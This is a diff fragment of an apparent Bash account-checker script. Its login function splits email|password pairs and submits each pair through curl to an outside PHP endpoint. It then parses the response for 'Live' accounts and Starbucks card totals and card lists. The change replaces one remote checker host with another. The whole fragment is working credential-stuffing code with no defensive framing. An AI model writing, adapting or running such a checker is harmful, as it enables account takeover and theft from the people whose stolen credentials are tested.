@@ -13,7 +13,7 @@ login(){
 	empass=$1
 	mail=$(printf "$empass" | awk -F '|' '{print $1}')
 	pass=$(printf "$empass" | awk -F '|' '{print $2}')
-	ngecurl=$(curl -s "http://api.clusterjasmine.com/sbux.php?mail=${mail}&pass=${pass}")
+	ngecurl=$(curl -s "https://tool-sipekk.c9users.io/starbuck/api.php?mail=${mail}&pass=${pass}")
 	total=$(echo "$ngecurl" | grep -Po '(?<=SbuxCard\(<font color=lime>)[^ Cards]*')
 	cardlist=$(echo "$ngecurl" | grep -Po '(?<=\[<font color=lime>)[^\]]*' | sed 's:<[^>]*>::g')
 	if [[ $ngecurl =~ "Live" ]]; then
